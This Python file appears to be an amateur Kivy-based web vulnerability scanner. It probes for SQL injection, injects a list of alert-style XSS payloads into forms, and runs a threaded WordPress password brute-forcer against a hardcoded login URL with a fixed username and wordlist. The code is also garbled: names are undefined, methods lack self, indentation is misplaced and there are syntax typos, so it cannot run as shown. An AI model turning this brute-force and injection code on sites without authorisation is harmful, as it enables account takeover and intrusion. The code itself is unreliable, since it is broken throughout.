#!/usr/bin/python3
import kivy
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.gridlayout import GridLayout
from kivy.uix.textinput import TextInput
import requests
from bs4 import BeautifulSoup
import argparse
from concurrent.futures import ThreadPoolExecutor
import subprocess
import csv
from urllib.parse import urljoin
from pprint import pprint
from lxml import etree
from queue import Queue
import sys
import threading
import time

class VulnScanner(GridLayout):
    def __init__(self, url):
        super(VulnScanner, self).__init__(**kwargs)
        
        name = 'Vulnerability-scanner'
        self.url = url
        self.vulnerabilities = []
        self.payloads = [
            'sql_injection_payload1',
            'sql_injection_payload2',
            'sql_injection_payload3',
            'xss_injection_payload1',
            'xss_injection_payload2'
        ]
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        self.log_file = open('log.csv', 'w', newline='')
        self.log_writer - csv.writer(self.log_file)
        self.log_writer.writerow(['Target', 'Vulnerability', 'Exploitable'])

    def scan_target(self, target_url):
        target = target(target_url)
        for payload in self.payloads:
            try:
                #send payload to target and show response
                response = requests.get(target_url + payload, headers=self.headers)
                if 'vulnerable' in response.text.lower():
                    print(f'{target_url} is vulnerable to {payload}')
                    target.vulnerabilities.append(payload)
                    #attempt to exploit vulnerabilities
                    exploit_response = requests.get(target_url + payload + '=exploit', headers=self.headers)
                    if 'success' in exploit_response.text.lower():
                        print(f'Successfully exploited {target_url} with {payload}')
                        target.vulnerabilities.append(f'{payload} (exploitable)')
                        self.log_writer.writerow([target_url, payload, 'Yes'])
                    else:
                        print(f'Failed to exploit {target_url} with {payload}')
                        self.log_writer.writerow([target_url, payload, 'No'])
                        print(f'{target_url} is not vulnerable to {payload}')
            except:
                print(f'Error checking for vulnerability {payload} on {target_url}')
                self.log_file.flush()
    
    def check_sql_injection(self, target_url):
        target = Target(target_url)
        #initialise http session and set the browser
        s = requests.Session()
        s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
        #extract web forms
    
    def get_all_forms(target_url):
        #return all forms from html content
        soup = BeautifulSoup(s.get(url).content, "html.parser")
        return soup.find_all_forms
    
    def get_form_details(form):
        #extract every possible infomation on the html form
        details = {}
        #get form action of the target url
        try:
            action = form.attrs.get("action").lower()
        except:
            action = None
            # get the form method (POST, GET, etc.)
            method = form.attrs.get("method", "get").lower()
            # get all the input details such as type and name
            inputs = []
            for input_tag in form.find_all("input"):
                input_type = input_tag.attrs.get("type", "text")
                input_name = input_tag.attrs.get("name")
                input_value = input_tag.attrs.get("value", "")
                inputs.append({"type": input_type, "name": input_name, "value": input_value})
                # put everything to the resulting dictionary
                details["action"] = action
                details["method"] = method
                details["inputs"] = inputs
                return details

    def is_vulnerable(response):
        #A simple boolean function that determines whether a page is sql injectable
        errors = {
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        }
        for error in errors:
            if error in response.content.decode().lower():
                return True
        return False    
    
    def scan_sql_injection(url):
            for c in "\"'":
                new_url = f"{url}{c}"
                print("[!] Trying", new_url)
                res = s.get(new_url)
                if is_vulnerable(res):
                    print("[+] SQL Injection vulnerability detected, link:", new_url)
                    return
                    forms = get_all_forms(url)
                    print(f"[+] Detected {len(forms)} forms on {url}.")
                    self.log_writer.writerow(['Target', 'Sql-Vulnerability', 'Exploitable'])
                    self.log_file.flush()

    def check_outdated_components(self, target_url):
        try:
            subprocess.run(["ncu"], check=True, shell=True)
            vulnerabilities = subprocess.run(["ncu", "-u", "-a"], capture_output=True, text=True)
            vulnerabilities = vulnerabilities.stdout.split("\n")
            vulnerabilities = [vuln.split(" ")[0] for vuln in vulnerabilities if vuln != ""]
            if vulnerabilities:
                target = Target(target_url)
                target.vulnerabilities += vulnerabilites
                for vuln in vulnerabilities:
                    self.log_writer.writerow([target_url, vuln, 'N/A'])
                    self.log_file.flush()
                    print(f'{target_url} has the following npm vulnerabilities: {vulnerabilities}')
            else:
                print(f'{target_url} has no vulnerabilities')
        except subprocess.CalledProcessError:
            print(f'Error checking for npm vulnerabilities on {target_url}')
        
    def check_brute_force(self, target_url):
        target = Target(target_url)
        #check bruteforce
        SUCCESS = 'Welcome to Word Press!'
        target = "http://boodelyboo.com/wordpress/wp-login.php"
        WORDLIST = '/home/tim/bhp/bhp/cain.txt'
    
    def get_words():
        with open(WORDLIST) as f:
            raw_words = f.read()
            words = Queue()
            for words in raw_words.split():
                words.put(word)
                return words
    
    def get_params(content):
        params = dict()
        parser = etree.HTMLParser()
        tree = etree.parse(BytesIO(content), parser=parser)
        for elem in tree.findall('//input'): 
            # find all input elements
            name = elem.get('name')
            if name is not None:
                params[name] = elem.get('value', None)
                return param

class Bruter:
    def __init__(self, username, url):
        username = username.username
        url = self.url
        self.found = False
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print("Finished the setup where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username
        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd
            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f"\nBruteforcing successful.")
                print("Username is %s" % self.username)
                print("Password is %s\n" % brute)
                print('done: now cleaning up other threads.')

                words = get_words()
                b = Bruter('tim', url)
                b.run_bruteforce(words)

    def bypass_waf(self, target_url):
        target = Target(target_url)
        #check waf exploit
        pass
    def check_xss_injection(self, target_url):
        target = Target(target_url)
        #check xss injection
        payloads = [
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<body onload=alert("XSS")>',
        '"><svg/onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\');">',
        '\'"--><script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<input type="text" value="<script>alert(\'XSS\')</script>">',
        # more payloads can be added as much
        ]
        #get forms
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parse')
        forms = soup.findall('form')
        found_xss = False
        #Loop over forms
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            #each payload testing is done by injecting into form fields
            for payload in payloads:
                data = {}
                #find inputs in the form and fill them with test data
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name')
                    input_type = input_tag.get('type', 'text')
                    if input_type == 'text':
                        data[input_name] = payload
                    elif input_type == 'hidden':
                        data[input_name] = input_tag.get('value', '') 
                        #send request to form
                        if method == 'post':
                            response = requests.post(target_url + action, data=data)
                        else:
                            response = requests.get(target_url + action, params=data)
                            #check answers 
                            if payload in response.text:
                                print(f'XSS found ({payload}): {target_url + action}')
                                found_xss = True
                                self.log_writer.writerow(['Target', 'Xss-Vulnerability', 'Exploitable'])
                                self.log_file.flush()
                                #if nothing about xss found,tell user
                            if not found_xss:
                                print(f'XSS not found: {target_url}')
                                test_xss(target_url)
        
    def verify_exploit(self, target_url):
        target = Target(target_url)
        #verify exploit
    def scan(self, target_urls, threads):
        with ThreadPoolExecutor() as executor:
            #scan vulnerabilities
            executor.map(self.scan_target, target_urls)
            executor.map(self.check_sql_injection, target_urls)
            executor.map(self.check_outdated_components, target_url)
            executor.map(self.check_brute_force, target_urls)
            executor.map(self.check_xss_injection, target_urls)
            executor.map(self.bypass_waf, target_urls)
            executor.map(self.verify_exploit, target_urls)
            self.log_file.close()
        
class DevilDogApp(App):
    def build(self):
        return VulnScanner()

if __name__ == '__main__':
    DevilDogApp().run()